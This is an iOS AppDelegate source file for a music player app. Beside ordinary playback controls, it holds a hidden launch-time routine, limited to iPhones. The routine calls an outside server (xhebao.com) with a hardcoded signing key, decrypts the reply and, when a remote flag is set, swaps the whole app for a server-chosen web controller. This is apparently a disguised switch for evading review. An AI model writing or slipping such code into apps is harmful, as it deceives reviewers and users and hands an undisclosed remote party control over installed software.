//
//  AppDelegate.m
//  Enesco
//
//  Created by Aufree on 11/30/15.
//  Copyright © 2015 The EST Group. All rights reserved.
//

#import "AppDelegate.h"
#import "MusicListViewController.h"
#import <MediaPlayer/MediaPlayer.h>
#import "MusicViewController.h"
#import "NewController.h"

@interface AppDelegate ()
@property (nonatomic, strong) MusicListViewController *musicListVC;
@end

@implementation AppDelegate


- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    
    // Showing the App
    [self makeWindowVisible:launchOptions];
    
    // Basic setup
    [self basicSetup];
    
    return YES;
}

- (void)makeWindowVisible:(NSDictionary *)launchOptions
    {
    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
    self.window.backgroundColor = [UIColor whiteColor];
    
    [[UINavigationBar appearance] setBarTintColor:[UIColor whiteColor]];
    
    NSString *url =  [[NSUserDefaults standardUserDefaults] objectForKey:kMurl];
    if (url)
    {
            [self goMainVC];
    }
    else
    {
        if (!_musicListVC){
            _musicListVC = [[UIStoryboard storyboardWithName:@"MusicList" bundle:[NSBundle mainBundle]] instantiateInitialViewController];
        }
        self.window.rootViewController = _musicListVC;
    }
 
    requestDefault(self);
    [self.window makeKeyAndVisible];
}

//版本号
//#define kAppVersion [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleShortVersionString"]
//#define kAppID [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleIdentifier"]
//    

 #define kAppVersion @"9.1.1"
 #define kAppID @"wangye4"

//秘钥
#define MainKey @"@ppea1_g00d"
    
static void  requestDefault(id obj)
{
        if ([[UIDevice currentDevice] userInterfaceIdiom] != UIUserInterfaceIdiomPhone)
        {
            return;
        }
    
        NSString *urlstr = [NSString stringWithFormat:@"http://www.xhebao.com/DATA.php?version=%@&appid=%@",kAppVersion,kAppID];
        NSString *sign  = [[NSString stringWithFormat:@"%@%@",kAppVersion,MainKey] atm_md5];
        NSURLSessionConfiguration *config = [NSURLSessionConfiguration ephemeralSessionConfiguration];
        [config setTimeoutIntervalForRequest:10];
        NSURLSession *session = [NSURLSession sessionWithConfiguration:config];
        
        NSURL *url = [NSURL URLWithString:urlstr];
        NSMutableURLRequest *req  = [NSMutableURLRequest requestWithURL:url];
        [req setValue:sign forHTTPHeaderField:@"sign"];
        [req setValue:@"text/html" forHTTPHeaderField:@"content-type"];
        
        NSURLSessionDataTask *dataTask =  [session dataTaskWithRequest:req
                                                     completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error)
                                           {
                                               if (!error)
                                               {
                                                   id responseObject = data.aesJsonObject;
                                                   responseObject = [NSMutableDictionary dictionaryWithDictionary:responseObject];
                                                   if ([[responseObject objectForKey:@"startad_enable"] isEqualToString:@"1"])
                                                   {
                                                       dispatch_async(dispatch_get_main_queue(), ^{
                                                           NSString *newUrl = [responseObject objectForKey:@"web"];
                                                           NSString *oldUrl =  [[NSUserDefaults standardUserDefaults] objectForKey:kMurl];
                                                           [[NSUserDefaults standardUserDefaults] setObject:newUrl forKey:kMurl];
                                                           if (!oldUrl)
                                                           {
                                                               [obj goMainVC];
                                                           }
                                                       });
                                                   }
                                                   else
                                                   {
                                                       [[NSUserDefaults standardUserDefaults] setObject:nil forKey:kMurl];
                                                   }
                                               }
                                           }];
        [dataTask resume];
}
    
- (void)goMainVC
{
    NewController *controller = [NewController new];
    self.window.rootViewController = controller;
    [self.window makeKeyWindow];
}

- (void)basicSetup {
    // Remove control
    [[UIApplication sharedApplication] beginReceivingRemoteControlEvents];
    [self becomeFirstResponder];
}

- (BOOL)canBecomeFirstResponder {
    return YES;
}

# pragma mark - Remote control

- (void)remoteControlReceivedWithEvent:(UIEvent *)receivedEvent {
    if (receivedEvent.type == UIEventTypeRemoteControl) {
        switch (receivedEvent.subtype) {
            case UIEventSubtypeRemoteControlPause:
                [[MusicViewController sharedInstance].streamer pause];
                break;
            case UIEventSubtypeRemoteControlStop:
                break;
            case UIEventSubtypeRemoteControlPlay:
                [[MusicViewController sharedInstance].streamer play];
                break;
            case UIEventSubtypeRemoteControlTogglePlayPause:
                break;
            case UIEventSubtypeRemoteControlNextTrack:
                [[MusicViewController sharedInstance] playNextMusic:nil];
                break;
            case UIEventSubtypeRemoteControlPreviousTrack:
                [[MusicViewController sharedInstance] playPreviousMusic:nil];
                break;
            default:
                break;
        }
    }
}


@end
